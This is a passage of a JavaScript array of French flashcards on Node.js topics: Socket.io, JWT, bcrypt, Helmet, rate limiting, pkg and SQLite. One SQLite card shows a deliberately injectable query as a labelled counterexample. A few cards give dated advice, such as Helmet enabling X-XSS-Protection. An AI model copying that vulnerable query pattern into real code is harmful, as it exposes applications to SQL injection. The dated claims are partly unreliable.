</pre>`,freq:"easy",},
  {id:"p2_new_53",proj:"p2",num:53,category:`Socket.io 4.7`,thematique:`Socket.io`,question:`Qu'est-ce que le namespace dans Socket.io ?`,answer:`<p>Un <b>namespace</b> permet de <b>séparer les connexions</b> en groupes isolés.</p>
<pre>// Serveur
const adminNamespace = io.of('/admin');
adminNamespace.on('connection', (socket) =&gt; {
  console.log('Client connecté à /admin');
});

// Client
const adminSocket = io('/admin');
</pre>`,freq:"med",},
  {id:"p2_new_54",proj:"p2",num:54,category:`Socket.io 4.7`,thematique:`Socket.io`,question:`Comment gérer la déconnexion d'un client ?`,answer:`<pre>io.on('connection', (socket) =&gt; {
  socket.on('disconnect', () =&gt; {
    console.log('Client déconnecté !');
  });
});
</pre>`,freq:"hot",},
  {id:"p2_new_55",proj:"p2",num:55,category:`Socket.io 4.7`,thematique:`Socket.io`,question:`Comment diffuser un message à tous les clients sauf l'émetteur ?`,answer:`<p>Utilise <code>socket.broadcast.emit()</code> :</p>
<pre>socket.on('chatMessage', (msg) =&gt; {
  socket.broadcast.emit('chatMessage', msg);
  // Envoie à tous SAUF l'émetteur
});
</pre>`,freq:"hot",},
  {id:"p2_new_56",proj:"p2",num:56,category:`Socket.io 4.7`,thematique:`Socket.io`,question:`Comment stocker des données par socket ?`,answer:`<p>Utilise <code>socket.data</code> (Socket.io v4+) :</p>
<pre>io.on('connection', (socket) =&gt; {
  socket.data.username = 'Jean';
  console.log(socket.data.username);  // 'Jean'
});
</pre>`,freq:"med",},
  {id:"p2_new_57",proj:"p2",num:57,category:`Socket.io 4.7`,thematique:`Socket.io`,question:`Comment limiter le nombre de connexions par IP ?`,answer:`<pre>const connections = new Map();

io.on('connection', (socket) =&gt; {
  const ip = socket.handshake.address;
  if ((connections.get(ip) || 0) &gt;= 3) {
    socket.disconnect(true);  // &gt; 3 connexions → déconnecte
    return;
  }
  connections.set(ip, (connections.get(ip) || 0) + 1);
  socket.on('disconnect', () =&gt; {
    connections.set(ip, connections.get(ip) - 1);
  });
});
</pre>`,freq:"med",},
  {id:"p2_new_58",proj:"p2",num:58,category:`Socket.io 4.7`,thematique:`Socket.io`,question:`Comment utiliser Socket.io avec Express et les mêmes routes ?`,answer:`<p>Socket.io et Express coexistent sur le même port :</p>
<pre>const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer);

app.get('/', (req, res) =&gt; {
  res.sendFile(__dirname + '/index.html');
});

io.on('connection', (socket) =&gt; {
  socket.emit('news', { hello: 'world' });
});

httpServer.listen(3000);
</pre>`,freq:"hot",},
  {id:"p2_new_59",proj:"p2",num:59,category:`Socket.io 4.7`,thematique:`Socket.io`,question:`Comment utiliser JWT avec Socket.io ?`,answer:`<b>Client</b> — passe le token lors de la connexion :
<pre>const socket = io({
  auth: { token: localStorage.getItem('token') }
});
</pre>
<b>Serveur</b> — vérifie le token :
<pre>io.on('connection', (socket) =&gt; {
  const token = socket.handshake.auth.token;
  try {
    const user = jwt.verify(token, process.env.JWT_SECRET);
    socket.user = user;
  } catch (err) {
    socket.disconnect(true);  // Token invalide → déconnecte
  }
});
</pre>`,freq:"med",},
  {id:"p2_new_60",proj:"p2",num:60,category:`Socket.io 4.7`,thematique:`Socket.io`,question:`Comment tester Socket.io avec un client HTML ?`,answer:`<pre>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;
  &lt;script src="/socket.io/socket.io.js"&gt;&lt;/script&gt;
  &lt;script&gt;
    const socket = io();
    socket.on('news', (data) =&gt; {
      console.log('Message reçu :', data);
      socket.emit('my other event', { my: 'data' });
    });
  &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre>`,freq:"easy",},
  {id:"p2_new_61",proj:"p2",num:61,category:`JWT & bcryptjs`,thematique:`JWT & Sécurité`,question:`Qu'est-ce que JWT (JSON Web Token) ?`,answer:`<p>Un <b>JWT</b> est un <b>jeton d'authentification</b> JSON, <b>signé</b> avec une clé secrète. Il est composé de 3 parties :</p>
<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><b>Header</b> : Type (<code>JWT</code>) + algorithme (ex: <code>HS256</code>).</li>
<li><b>Payload</b> : Données (ex: <code>userId</code>, <code>exp</code>).</li>
<li><b>Signature</b> : Vérifie l'intégrité du token.</li>
</ul>
<b>Format</b> : <code>xxxxx.yyyyy.zzzzz</code> (Base64URL).`,freq:"hot",},
  {id:"p2_new_62",proj:"p2",num:62,category:`JWT & bcryptjs`,thematique:`JWT & Sécurité`,question:`Comment générer un token JWT ?`,answer:`<pre>const jwt = require('jsonwebtoken');

const payload = { userId: 123, username: 'Jean' };
const secret = process.env.JWT_SECRET;

const token = jwt.sign(payload, secret, { expiresIn: '1h' });
console.log(token);
</pre>
<p>Options : <code>expiresIn: '8h'</code>, <code>algorithm: 'HS256'</code>.</p>`,freq:"hot",},
  {id:"p2_new_63",proj:"p2",num:63,category:`JWT & bcryptjs`,thematique:`JWT & Sécurité`,question:`Comment vérifier un token JWT ?`,answer:`<pre>try {
  const decoded = jwt.verify(token, process.env.JWT_SECRET);
  console.log(decoded);
  // { userId: 123, iat: 1654321000, exp: 1654324600 }
} catch (err) {
  console.error('Token invalide :', err.message);
  // JsonWebTokenError ou TokenExpiredError
}
</pre>`,freq:"hot",},
  {id:"p2_new_64",proj:"p2",num:64,category:`JWT & bcryptjs`,thematique:`JWT & Sécurité`,question:`Qu'est-ce que le payload d'un JWT ?`,answer:`<p>Le <b>payload</b> contient les <b>claims</b> (informations) :</p>
<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><b>Claims standard</b> : <code>iss</code> (émetteur), <code>sub</code> (sujet), <code>exp</code> (expiration), <code>iat</code> (créé à).</li>
<li><b>Claims personnalisés</b> :</li>
<pre>const payload = { userId: 123, role: 'admin' };
</pre>
</ul>
<b>⚠️ Important</b> : Le payload est seulement encodé en Base64, pas chiffré — ne jamais y mettre de mot de passe !`,freq:"hot",},
  {id:"p2_new_65",proj:"p2",num:65,category:`JWT & bcryptjs`,thematique:`JWT & Sécurité`,question:`Comment décoder un JWT sans vérifier la signature ?`,answer:`<pre>const decoded = jwt.decode(token);
console.log(decoded);  // Affiche le payload décodé
</pre>
<b>⚠️ Attention</b> : <code>decode()</code> ne vérifie <b>pas</b> la signature ! Utilise <code>verify()</code> pour la sécurité.`,freq:"med",},
  {id:"p2_new_66",proj:"p2",num:66,category:`JWT & bcryptjs`,thematique:`JWT & Sécurité`,question:`Comment créer un middleware d'authentification JWT dans Express ?`,answer:`<pre>const jwt = require('jsonwebtoken');

function authenticateJWT(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader) return res.status(401).send('Token manquant.');

  const token = authHeader.split(' ')[1];  // "Bearer &lt;token&gt;"
  jwt.verify(token, process.env.JWT_SECRET, (err, user) =&gt; {
    if (err) return res.status(403).send('Token invalide ou expiré.');
    req.user = user;
    next();
  });
}

app.get('/protected', authenticateJWT, (req, res) =&gt; {
  res.json({ message: 'Accès autorisé !', user: req.user });
});
</pre>`,freq:"hot",},
  {id:"p2_new_67",proj:"p2",num:67,category:`JWT & bcryptjs`,thematique:`JWT & Sécurité`,question:`Qu'est-ce qu'un refresh token ?`,answer:`<p>Un <b>refresh token</b> est un token <b>longue durée</b> (ex: 7 jours) utilisé pour <b>obtenir un nouveau JWT</b> (court: 1h) sans que l'utilisateur se reconnecte.</p>
<pre>// Générer un refresh token
const refreshToken = jwt.sign(
  { userId: 123 },
  process.env.REFRESH_SECRET,
  { expiresIn: '7d' }
);

// Route de rafraîchissement
app.post('/refresh-token', (req, res) =&gt; {
  const { refreshToken } = req.body;
  const user = jwt.verify(refreshToken, process.env.REFRESH_SECRET);
  const newToken = jwt.sign({ userId: user.userId }, process.env.JWT_SECRET, { expiresIn: '1h' });
  res.json({ token: newToken });
});
</pre>`,freq:"med",},
  {id:"p2_new_68",proj:"p2",num:68,category:`JWT & bcryptjs`,thematique:`JWT & Sécurité`,question:`Comment invalider un JWT ?`,answer:`<p>Les JWT sont <b>stateless</b>, donc impossible à invalider directement. Solutions :</p>
<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><b>Liste noire (blacklist)</b> : Stocker les tokens invalidés en BDD.</li>
<li><b>Court temps d'expiration</b> : JWT de 5 min + refresh token.</li>
<li><b>Changer la clé secrète</b> : Tous les anciens tokens deviennent invalides.</li>
<pre>const blacklistedTokens = new Set();

app.post('/logout', authenticateJWT, (req, res) =&gt; {
  blacklistedTokens.add(req.headers.authorization.split(' ')[1]);
  res.send('Déconnexion réussie.');
});
</pre>
</ul>`,freq:"med",},
  {id:"p2_new_69",proj:"p2",num:69,category:`JWT & bcryptjs`,thematique:`JWT & Sécurité`,question:`Comment stocker le JWT côté client ?`,answer:`<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><b>Cookie HTTP-only</b> (recommandé) :</li>
<pre>res.cookie('token', token, { httpOnly: true, secure: true });
</pre>
<li><b>localStorage</b> (moins sécurisé, vulnérable XSS) :</li>
<pre>localStorage.setItem('token', token);
</pre>
<li><b>En mémoire</b> (variable JS) : le plus sécurisé mais perdu au rechargement.</li>
</ul>`,freq:"med",},
  {id:"p2_new_70",proj:"p2",num:70,category:`JWT & bcryptjs`,thematique:`JWT & Sécurité`,question:`Comment envoyer le JWT dans une requête HTTP ?`,answer:`<p>Dans le header <code>Authorization</code> (méthode recommandée) :</p>
<pre>Authorization: Bearer &lt;token&gt;
</pre>
<p>Exemple côté client avec fetch :</p>
<pre>fetch('/api/protected', {
  headers: {
    'Authorization': <code>Bearer \${token}</code>
  }
});
</pre>`,freq:"hot",},
  {id:"p2_new_71",proj:"p2",num:71,category:`JWT & bcryptjs`,thematique:`JWT & Sécurité`,question:`Qu'est-ce que bcrypt et pourquoi l'utiliser ?`,answer:`<code>bcrypt</code> est un algorithme de <b>hachage de mots de passe</b> conçu pour être <b>lent</b> (résistant aux attaques par force brute). <code>bcryptjs</code> est une implémentation pure JavaScript.
<b>Avantages vs MD5/SHA-1</b> :
<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><b>Salage automatique</b> (valeur aléatoire unique par mot de passe).</li>
<li><b>Coût ajustable</b> (nombre d'itérations).</li>
<li><b>Résistant aux GPU/ASIC</b>.</li>
</ul>`,freq:"hot",},
  {id:"p2_new_72",proj:"p2",num:72,category:`JWT & bcryptjs`,thematique:`JWT & Sécurité`,question:`Comment hasher un mot de passe avec bcrypt ?`,answer:`<pre>const bcrypt = require('bcryptjs');

async function hashPassword(password) {
  const salt = await bcrypt.genSalt(10);  // 10 rounds
  const hash = await bcrypt.hash(password, salt);
  return hash;
}

// Sortie : $2a$10$N9qo8uLOickgx2ZMRZoMy...
</pre>`,freq:"hot",},
  {id:"p2_new_73",proj:"p2",num:73,category:`JWT & bcryptjs`,thematique:`JWT & Sécurité`,question:`Comment comparer un mot de passe avec un hash bcrypt ?`,answer:`<pre>async function comparePassword(password, hash) {
  const match = await bcrypt.compare(password, hash);
  return match;  // true si correspond
}

// Lors de la connexion :
const ok = await bcrypt.compare(motDePasseSaisi, hashEnBase);
if (!ok) return res.status(401).json({ error: 'Mot de passe incorrect.' });
</pre>`,freq:"hot",},
  {id:"p2_new_74",proj:"p2",num:74,category:`JWT & bcryptjs`,thematique:`JWT & Sécurité`,question:`Qu'est-ce que le salt dans bcrypt ?`,answer:`<p>Le <b>salt</b> est une <b>valeur aléatoire unique</b> générée pour chaque mot de passe avant le hachage. Il empêche :</p>
<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li>Les <b>attaques par rainbow table</b> (tables pré-calculées).</li>
<li>Que deux mots de passe identiques aient le <b>même hash</b>.</li>
<pre>const salt = await bcrypt.genSalt(10);
// Ex: "$2a$10$N9qo8uLOickgx2ZMRZoMy"
</pre>
</ul>`,freq:"hot",},
  {id:"p2_new_75",proj:"p2",num:75,category:`JWT & bcryptjs`,thematique:`JWT & Sécurité`,question:`Comment choisir le cost factor (saltRounds) ?`,answer:`<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><b>10-12</b> : Recommandé (équilibre sécurité/performance).</li>
<li><b>> 12</b> : Pour mots de passe très sensibles, mais ralentit le serveur.</li>
<li><b>< 10</b> : À éviter (trop rapide).</li>
<pre>const start = Date.now();
await bcrypt.hash('test', 12);
console.log(<code>Temps : \${Date.now() - start}ms</code>);  // ~300ms
</pre>
</ul>`,freq:"med",},
  {id:"p2_new_76",proj:"p2",num:76,category:`JWT & bcryptjs`,thematique:`JWT & Sécurité`,question:`Comment stocker les mots de passe en base de données ?`,answer:`<pre>// Lors de l'inscription
const hashedPassword = await bcrypt.hash(password, 12);
db.prepare('INSERT INTO users (username, password_hash) VALUES (?, ?)')
  .run('Jean', hashedPassword);

// ✅ Stocker uniquement le HASH
// ❌ Ne jamais stocker le mot de passe en clair
</pre>`,freq:"hot",},
  {id:"p2_new_77",proj:"p2",num:77,category:`JWT & bcryptjs`,thematique:`JWT & Sécurité`,question:`Quelles sont les bonnes pratiques pour les mots de passe ?`,answer:`<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><b>Toujours hasher</b> avec bcrypt (ou Argon2).</li>
<li><b>Ne jamais stocker</b> le mot de passe en clair.</li>
<li><b>Utiliser un salt unique</b> par mot de passe.</li>
<li><b>Cost factor 10-12</b>.</li>
<li><b>Mots de passe forts</b> (min 8 caractères, majuscules, chiffres, symboles).</li>
<li><b>Limiter les tentatives</b> de connexion avec <code>express-rate-limit</code>.</li>
</ul>`,freq:"hot",},
  {id:"p2_new_78",proj:"p2",num:78,category:`Helmet.js & express-rate-limit`,thematique:`Sécurité HTTP`,question:`Qu'est-ce que Helmet ?`,answer:`<p>Helmet est un <b>middleware Express</b> qui <b>sécurise les headers HTTP</b> pour protéger ton application contre des attaques courantes (XSS, clickjacking, MIME sniffing, etc.).</p>`,freq:"hot",},
  {id:"p2_new_79",proj:"p2",num:79,category:`Helmet.js & express-rate-limit`,thematique:`Sécurité HTTP`,question:`Comment utiliser Helmet avec Express ?`,answer:`<pre>npm install helmet
</pre>
<pre>const helmet = require('helmet');
app.use(helmet());  // Applique tous les headers par défaut
</pre>`,freq:"easy",},
  {id:"p2_new_80",proj:"p2",num:80,category:`Helmet.js & express-rate-limit`,thematique:`Sécurité HTTP`,question:`Quels headers Helmet configure-t-il par défaut ?`,answer:`<p>| Header | Description |</p>
<p>|--------|-------------|</p>
<p>| <code>Content-Security-Policy</code> | Restreint les sources autorisées (anti-XSS) |</p>
<p>| <code>X-XSS-Protection</code> | Active la protection XSS du navigateur |</p>
<p>| <code>X-Content-Type-Options: nosniff</code> | Empêche le MIME sniffing |</p>
<p>| <code>X-Frame-Options: SAMEORIGIN</code> | Empêche le clickjacking |</p>
<p>| <code>Referrer-Policy</code> | Contrôle le header Referer |</p>`,freq:"hot",},
  {id:"p2_new_81",proj:"p2",num:81,category:`Helmet.js & express-rate-limit`,thematique:`Sécurité HTTP`,question:`Comment configurer le CSP (Content Security Policy) ?`,answer:`<pre>app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "trusted-cdn.com"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:"]
    }
  })
);
</pre>
<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><code>defaultSrc: ["'self'"]</code> : Autorise uniquement les ressources du même domaine.</li>
<li><code>'unsafe-inline'</code> : Autorise les scripts/styles en ligne (à limiter).</li>
</ul>`,freq:"med",},
  {id:"p2_new_82",proj:"p2",num:82,category:`Helmet.js & express-rate-limit`,thematique:`Sécurité HTTP`,question:`Comment désactiver un header spécifique avec Helmet ?`,answer:`<pre>app.use(
  helmet({
    contentSecurityPolicy: false,  // Désactive CSP
    xssFilter: false               // Désactive X-XSS-Protection
  })
);
</pre>`,freq:"med",},
  {id:"p2_new_83",proj:"p2",num:83,category:`Helmet.js & express-rate-limit`,thematique:`Sécurité HTTP`,question:`Qu'est-ce que le header \`X-Frame-Options\` ?`,answer:`<p>Empêche ton site d'être <b>affiché dans une iframe</b> (clickjacking).</p>
<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><code>DENY</code> : Interdit l'affichage dans toute iframe.</li>
<li><code>SAMEORIGIN</code> : Autorise uniquement si l'iframe est sur le même domaine.</li>
<pre>app.use(helmet.frameguard({ action: 'deny' }));
</pre>
</ul>`,freq:"med",},
  {id:"p2_new_84",proj:"p2",num:84,category:`Helmet.js & express-rate-limit`,thematique:`Sécurité HTTP`,question:`Qu'est-ce que le header HSTS (Strict-Transport-Security) ?`,answer:`<p>Force le navigateur à utiliser <b>HTTPS</b> pour toutes les requêtes futures, même si l'utilisateur tape <code>http://</code>.</p>
<pre>app.use(
  helmet.hsts({
    maxAge: 31536000,     // 1 an en secondes
    includeSubDomains: true,
    preload: true
  })
);
</pre>
<b>⚠️ À utiliser uniquement en production avec HTTPS activé !</b>`,freq:"med",},
  {id:"p2_new_85",proj:"p2",num:85,category:`Helmet.js & express-rate-limit`,thematique:`Sécurité HTTP`,question:`Comment tester les headers de sécurité ?`,answer:`<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><b>Outils en ligne</b> : SecurityHeaders.com, Mozilla Observatory.</li>
<li><b>Commande cURL</b> :</li>
<pre>curl -I http://ton-site.com
</pre>
</ul>
<p>Cherche les headers <code>X-Frame-Options</code>, <code>Content-Security-Policy</code>, etc. dans la réponse.</p>`,freq:"easy",},
  {id:"p2_new_86",proj:"p2",num:86,category:`Helmet.js & express-rate-limit`,thematique:`Sécurité HTTP`,question:`Qu'est-ce que \`express-rate-limit\` ?`,answer:`<p>Un <b>middleware Express</b> qui <b>limite le nombre de requêtes</b> qu'un client peut faire dans une fenêtre de temps. Utile pour éviter les attaques par <b>force brute</b> ou <b>DDoS</b>.</p>`,freq:"hot",},
  {id:"p2_new_87",proj:"p2",num:87,category:`Helmet.js & express-rate-limit`,thematique:`Sécurité HTTP`,question:`Comment configurer un rate limiter basique ?`,answer:`<pre>const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,                   // 100 requêtes max
  message: 'Trop de requêtes, réessayez plus tard.'
});

app.use(limiter);  // Applique à toutes les routes
</pre>`,freq:"hot",},
  {id:"p2_new_88",proj:"p2",num:88,category:`Helmet.js & express-rate-limit`,thematique:`Sécurité HTTP`,question:`Comment limiter uniquement certaines routes ?`,answer:`<pre>// Uniquement les routes /api/*
app.use('/api/', limiter);

// Uniquement la route de login (très strict)
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  skipSuccessfulRequests: true
});
app.post('/login', loginLimiter, handleLogin);
</pre>`,freq:"hot",},
  {id:"p2_new_89",proj:"p2",num:89,category:`Helmet.js & express-rate-limit`,thematique:`Sécurité HTTP`,question:`Qu'est-ce que \`windowMs\` et \`max\` dans rate-limit ?`,answer:`<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><b><code>windowMs</code></b> : Durée de la fenêtre de temps en <b>millisecondes</b>.</li>
<li>Ex: <code>15 * 60 * 1000</code> = 15 minutes.</li>
<li><b><code>max</code></b> : Nombre <b>maximum de requêtes</b> autorisées par fenêtre.</li>
<li><b><code>skipSuccessfulRequests</code></b> : Ne compte que les requêtes échouées.</li>
</ul>`,freq:"hot",},
  {id:"p2_new_90",proj:"p2",num:90,category:`Helmet.js & express-rate-limit`,thematique:`Sécurité HTTP`,question:`Comment ignorer certaines routes (ex: /healthcheck) ?`,answer:`<p>Utilise l'option <code>skip</code> :</p>
<pre>const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  skip: (req) =&gt; req.path === '/healthcheck'
});
</pre>`,freq:"easy",},
  {id:"p2_new_91",proj:"p2",num:91,category:`Helmet.js & express-rate-limit`,thematique:`Sécurité HTTP`,question:`Comment limiter par utilisateur authentifié ?`,answer:`<pre>const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  keyGenerator: (req) =&gt; req.user?.id || req.ip
  // Utilise user.id si connecté, sinon l'IP
});
</pre>`,freq:"med",},
  {id:"p2_new_92",proj:"p2",num:92,category:`Helmet.js & express-rate-limit`,thematique:`Sécurité HTTP`,question:`Comment utiliser un store Redis pour le rate limiting ?`,answer:`<pre>npm install rate-limiter-flexible redis
</pre>
<pre>const { RateLimiterRedis } = require('rate-limiter-flexible');
const redis = require('redis');

const redisClient = redis.createClient({ host: 'localhost', port: 6379 });

const rateLimiter = new RateLimiterRedis({
  storeClient: redisClient,
  keyPrefix: 'rate_limit',
  points: 100,
  duration: 15 * 60  // 15 minutes
});

const limiter = (req, res, next) =&gt; {
  rateLimiter.consume(req.ip)
    .then(() =&gt; next())
    .catch(() =&gt; res.status(429).send('Trop de requêtes'));
};
</pre>`,freq:"med",},
  {id:"p2_new_93",proj:"p2",num:93,category:`pkg (Vercel) — Fondamentaux`,thematique:`pkg (Vercel)`,question:`Comment compiler un projet Node.js avec \`pkg\` ?`,answer:`<pre>npm install -g pkg
pkg app.js
</pre>
<p>Résultat : un exécutable généré pour la plateforme actuelle.</p>`,freq:"easy",},
  {id:"p2_new_94",proj:"p2",num:94,category:`pkg (Vercel) — Fondamentaux`,thematique:`pkg (Vercel)`,question:`Comment compiler pour plusieurs plateformes avec \`pkg\` ?`,answer:`<pre>pkg app.js --targets node18-linux-x64,node18-win-x64,node18-macos-x64
</pre>
<p>Format de cible : <code>node&lt;version&gt;-&lt;os&gt;-&lt;arch&gt;</code> — ex: <code>node18-win-x64</code>.</p>`,freq:"med",},
  {id:"p2_new_95",proj:"p2",num:95,category:`pkg (Vercel) — Fondamentaux`,thematique:`pkg (Vercel)`,question:`Comment spécifier la version de Node.js dans \`pkg\` ?`,answer:`<p>Dans <code>package.json</code> :</p>
<pre>{
  "pkg": {
    "scripts": ["app.js"],
    "targets": ["node18-linux-x64"]
  }
}
</pre>
<p>Ou via la ligne de commande : <code>pkg app.js --targets node18</code></p>`,freq:"med",},
  {id:"p2_new_96",proj:"p2",num:96,category:`pkg (Vercel) — Fondamentaux`,thematique:`pkg (Vercel)`,question:`Comment inclure des fichiers statiques dans le binaire pkg ?`,answer:`<pre>pkg app.js --assets public/**
</pre>
<p>Ou dans <code>package.json</code> :</p>
<pre>{
  "pkg": {
    "assets": ["public/**/*", "data/*.json"]
  }
}
</pre>
<p>Accès dans le code via <code>path.join(__dirname, 'public/fichier.html')</code>.</p>`,freq:"med",},
  {id:"p2_new_97",proj:"p2",num:97,category:`pkg (Vercel) — Fondamentaux`,thematique:`pkg (Vercel)`,question:`Comment gérer les modules natifs avec \`pkg\` ?`,answer:`<code>pkg</code> <b>ne supporte pas les modules natifs</b> (ex: <code>better-sqlite3</code>) directement, car ce sont des binaires C++ qui ne peuvent pas s'exécuter depuis le snapshot virtuel.
<b>Solution utilisée dans votre projet</b> :
<pre>// Extraire le binaire .node vers /tmp/ au premier lancement
if (IS_PKG) {
  fs.copyFileSync(srcNode, dstNode);
  Module._resolveFilename = (req, ...args) =&gt;
    req.endsWith('.node') ? dstNode : _original(req, ...args);
}
</pre>`,freq:"med",},
  {id:"p2_new_98",proj:"p2",num:98,category:`pkg (Vercel) — Fondamentaux`,thematique:`pkg (Vercel)`,question:`Quelles sont les limitations de \`pkg\` ?`,answer:`<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><b>Taille</b> : 50-100 Mo (embarque Node.js + dépendances).</li>
<li><b>Modules natifs</b> : Non supportés nativement (<code>.node</code> files).</li>
<li><b>Performances</b> : Légèrement plus lent qu'un projet Node.js classique.</li>
<li><b>Débogage</b> : Plus difficile.</li>
<li><b>Maintenance</b> : Le projet pkg n'est plus activement maintenu par Vercel.</li>
</ul>`,freq:"med",},
  {id:"p2_new_99",proj:"p2",num:99,category:`pkg (Vercel) — Fondamentaux`,thematique:`pkg (Vercel)`,question:`Comment réduire la taille du binaire généré par \`pkg\` ?`,answer:`<pre># Supprimer le bytecode
pkg app.js --no-bytecode

# Compresser le binaire
pkg app.js --compress Gzip

# Combiner
pkg app.js --no-bytecode --compress Gzip --output mon-app
</pre>
<p>Utilise aussi un fichier <code>.pkgignore</code> pour exclure les fichiers inutiles.</p>`,freq:"easy",},
  {id:"p2_new_100",proj:"p2",num:100,category:`pkg (Vercel) — Fondamentaux`,thematique:`pkg (Vercel)`,question:`Comment gérer les variables d'environnement dans un binaire \`pkg\` ?`,answer:`<p>Les variables d'environnement doivent être passées en argument ou lues depuis un fichier externe (pas via <code>.env</code> embarqué) :</p>
<pre>./mon-app  # Les variables sont lues depuis l'environnement système
</pre>
<p>Ou définies avant le lancement :</p>
<pre>JWT_SECRET=mon_secret PORT=3001 ./mon-app
</pre>`,freq:"med",},
  {id:"p2_new_101",proj:"p2",num:101,category:`pkg (Vercel) — Fondamentaux`,thematique:`pkg (Vercel)`,question:`Comment exclure des fichiers de la compilation \`pkg\` ?`,answer:`<p>Crée un fichier <code>.pkgignore</code> (comme <code>.gitignore</code>) :</p>
<pre>node_modules/
*.log
.env
tests/
</pre>`,freq:"easy",},
  {id:"p2_new_102",proj:"p2",num:102,category:`pkg (Vercel) — Fondamentaux`,thematique:`pkg (Vercel)`,question:`Comment tester un binaire \`pkg\` ?`,answer:`<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li>Compile le projet :</li>
<pre>pkg app.js --output mon-app
</pre>
<li>Exécute le binaire :</li>
<pre>./mon-app        # Linux/macOS
mon-app.exe      # Windows
</pre>
<li>Vérifie que le serveur démarre et que les routes répondent correctement.</li>
</ul>`,freq:"easy",},
  {id:"p2_new_103",proj:"p2",num:103,category:`SQLite (better-sqlite3)`,thematique:`SQLite`,question:`Qu'est-ce que SQLite et quels sont ses avantages ?`,answer:`<p>SQLite est une <b>base de données relationnelle légère et embarquée</b> (pas de serveur séparé).</p>
<b>Avantages</b> :
<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li>Stocke les données dans un <b>fichier unique</b> (<code>database.sqlite</code>).</li>
<li>Pas de configuration serveur.</li>
<li>Supporte les <b>transactions ACID</b>.</li>
<li>Multiplateforme (copiable).</li>
</ul>
<b>Inconvénients</b> :
<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li>Limité aux faibles charges (~10k req/s).</li>
<li>Pas de gestion multi-utilisateurs avancée.</li>
</ul>`,freq:"hot",},
  {id:"p2_new_104",proj:"p2",num:104,category:`SQLite (better-sqlite3)`,thematique:`SQLite`,question:`Comment créer une base de données SQLite avec \`better-sqlite3\` ?`,answer:`<pre>npm install better-sqlite3
</pre>
<pre>const Database = require('better-sqlite3');
const db = new Database('database.sqlite');
// Crée ou ouvre le fichier — prêt à l'emploi immédiatement
</pre>`,freq:"easy",},
  {id:"p2_new_105",proj:"p2",num:105,category:`SQLite (better-sqlite3)`,thematique:`SQLite`,question:`Comment créer une table avec \`better-sqlite3\` ?`,answer:`<pre>db.exec(\`
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    email TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
\`);
</pre>`,freq:"hot",},
  {id:"p2_new_106",proj:"p2",num:106,category:`SQLite (better-sqlite3)`,thematique:`SQLite`,question:`Comment insérer des données ?`,answer:`<pre>const insert = db.prepare(
  'INSERT INTO users (username, email) VALUES (?, ?)'
);
const info = insert.run('Jean', 'jean@example.com');
console.log(info.lastInsertRowid);  // ID de la ligne insérée
</pre>`,freq:"hot",},
  {id:"p2_new_107",proj:"p2",num:107,category:`SQLite (better-sqlite3)`,thematique:`SQLite`,question:`Comment sélectionner des données ?`,answer:`<pre>// Un seul résultat
const user = db.prepare(
  'SELECT * FROM users WHERE username = ?'
).get('Jean');

// Plusieurs résultats
const users = db.prepare('SELECT * FROM users').all();
</pre>`,freq:"hot",},
  {id:"p2_new_108",proj:"p2",num:108,category:`SQLite (better-sqlite3)`,thematique:`SQLite`,question:`Comment utiliser des requêtes paramétrées pour éviter les injections SQL ?`,answer:`<p>Utilise <code>?</code> comme placeholders — les valeurs sont toujours traitées comme des données, jamais comme du SQL :</p>
<pre>// ✅ Sécurisé
const user = db.prepare('SELECT * FROM users WHERE id = ?').get(userId);

// ❌ DANGER — injection SQL possible
const user = db.prepare(<code>SELECT * FROM users WHERE id = \${userId}</code>).get();
</pre>
<p>Dans votre projet, <b>toutes les requêtes sont préparées</b> dans <code>src/db/statements.js</code>.</p>`,freq:"hot",},
  {id:"p2_new_109",proj:"p2",num:109,category:`SQLite (better-sqlite3)`,thematique:`SQLite`,question:`Comment mettre à jour et supprimer des données ?`,answer:`<pre>// Mise à jour
db.prepare('UPDATE users SET email = ? WHERE id = ?')
  .run('nouveau@email.com', 1);

// Suppression
db.prepare('DELETE FROM users WHERE id = ?').run(1);
</pre>`,freq:"hot",},
  {id:"p2_new_110",proj:"p2",num:110,category:`SQLite (better-sqlite3)`,thematique:`SQLite`,question:`Comment utiliser les transactions avec SQLite ?`,answer:`<p>Les transactions groupent des requêtes qui doivent toutes réussir ou échouer ensemble :</p>
<pre>const transaction = db.transaction(() =&gt; {
  db.prepare('INSERT INTO users (username) VALUES (?)').run('Alice');
  db.prepare('UPDATE stats SET user_count = user_count + 1').run();
});
transaction();  // Si une erreur survient, tout est annulé
</pre>`,freq:"hot",},
  {id:"p2_new_111",proj:"p2",num:111,category:`SQLite (better-sqlite3)`,thematique:`SQLite`,question:`Comment compter le nombre de lignes dans une table ?`,answer:`<pre>const count = db.prepare(
  'SELECT COUNT(*) as count FROM users'
).get().count;
console.log(count);  // Ex: 42
</pre>`,freq:"easy",},
